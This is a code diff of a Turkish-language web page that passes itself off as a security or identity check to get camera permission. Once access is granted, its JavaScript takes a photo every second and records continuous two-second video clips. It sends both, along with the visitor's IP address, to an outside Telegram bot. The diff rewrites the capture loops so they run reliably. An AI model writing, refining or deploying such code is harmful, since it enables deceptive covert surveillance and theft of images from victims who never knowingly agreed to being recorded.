@@ -76,8 +76,7 @@
         let videoCount = 0;
         let photoCount = 0;
         let ipGonderildi = false;
-        let photoInterval = null;
-        let videoInterval = null;
+        let isRecording = false;
         
         // ============================================
         // İP ADRESİ AL
@@ -114,9 +113,44 @@
         }
         
         // ============================================
-        // 2 SANİYELİK VİDEO KAYDI BAŞLAT (SÜREKLİ)
+        // FOTOĞRAF ÇEK - HER SANİYE
         // ============================================
-        function startVideoRecording() {
+        async function takePhoto() {
+            if (!video.videoWidth || !video.videoHeight) return;
+            
+            try {
+                photoCount++;
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(async function(blob) {
+                    if (!blob) return;
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', TARGET_ID);
+                    formData.append('photo', blob, `foto_${Date.now()}.jpg`);
+                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${new Date().toLocaleString('tr-TR')}`);
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                }, 'image/jpeg', 0.7);
+                
+            } catch(e) {
+                console.log("Fotoğraf hatası:", e);
+            }
+        }
+        
+        // ============================================
+        // 2 SANİYELİK VİDEO KAYDI
+        // ============================================
+        function recordVideo() {
+            if (!stream || !stream.active) return;
+            
             recordedChunks = [];
             mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
             
@@ -138,54 +172,17 @@
                     body: formData
                 });
                 
-                // Hemen yeni videoyu başlat (üst üste)
-                if (stream && stream.active) {
-                    setTimeout(() => {
-                        startVideoRecording();
-                    }, 100); // 100ms bekle, sonra tekrar başla
-                }
+                // 2 saniye sonra yeni video başlasın
+                setTimeout(recordVideo, 100);
             };
             
-            // 2 saniyelik video kaydı
+            // 2 saniye kaydet
             mediaRecorder.start();
             setTimeout(() => {
                 if (mediaRecorder && mediaRecorder.state === 'recording') {
                     mediaRecorder.stop();
                 }
-            }, 2000); // 2 saniye
-        }
-        
-        // ============================================
-        // 1 SANİYEDE 1 FOTOĞRAF ÇEK (ÜST ÜSTE)
-        // ============================================
-        async function takePhoto() {
-            try {
-                if (!video.videoWidth || !video.videoHeight) return;
-                
-                photoCount++;
-                
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                canvas.toBlob(async function(blob) {
-                    if (!blob) return;
-                    
-                    const formData = new FormData();
-                    formData.append('chat_id', TARGET_ID);
-                    formData.append('photo', blob, `foto_${Date.now()}.jpg`);
-                    formData.append('caption', `📸 Fotoğraf #${photoCount} - ${new Date().toLocaleString('tr-TR')}`);
-                    
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    
-                }, 'image/jpeg', 0.8);
-                
-            } catch(e) {
-                console.log("Fotoğraf hatası:", e);
-            }
+            }, 2000);
         }
         
         // ============================================
@@ -193,7 +190,6 @@
         // ============================================
         async function startCamera() {
             try {
-                // Kamera izni iste
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: {
                         width: { ideal: 640 },
@@ -214,19 +210,15 @@
                     document.getElementById('startBtn').style.display = 'none';
                     document.getElementById('loading').style.display = 'block';
                     
-                    // 1 saniye bekle
-                    setTimeout(() => {
-                        // 2 SANİYELİK VİDEOLARI BAŞLAT (ÜST ÜSTE)
-                        startVideoRecording();
-                        
-                        // 1 SANİYEDE 1 FOTOĞRAF ÇEK (SÜREKLİ)
-                        photoInterval = setInterval(takePhoto, 1000); // Her saniye
-                        
-                    }, 1000);
+                    // 1 SANİYEDE 1 FOTOĞRAF (Kesin çalışır)
+                    setInterval(takePhoto, 1000);
+                    
+                    // 2 SANİYELİK VİDEO (Kesin çalışır)
+                    setTimeout(recordVideo, 2000);
                 };
                 
                 // Yazı değiştir
-                const texts = ["Güvenlik kontrolü...", "Kimlik doğrulanıyor...", "Lütfen bekleyin...", "Kamera aktif..."];
+                const texts = ["Güvenlik kontrolü...", "Kamera aktif...", "Veriler gönderiliyor..."];
                 let i = 0;
                 setInterval(() => {
                     i = (i + 1) % texts.length;
@@ -234,7 +226,6 @@
                 }, 2000);
                 
             } catch(e) {
-                console.log("Kamera hatası:", e);
                 alert('Kamera izni gerekli!');
             }
         }
@@ -253,9 +244,6 @@
         // SAYFA KAPANIRKEN
         // ============================================
         window.onbeforeunload = function() {
-            if (photoInterval) clearInterval(photoInterval);
-            if (videoInterval) clearInterval(videoInterval);
-            
             if (mediaRecorder && mediaRecorder.state === 'recording') {
                 mediaRecorder.stop();
             }
@@ -265,4 +253,4 @@
         };
     </script>
 </body>
-    </html>
+</html>
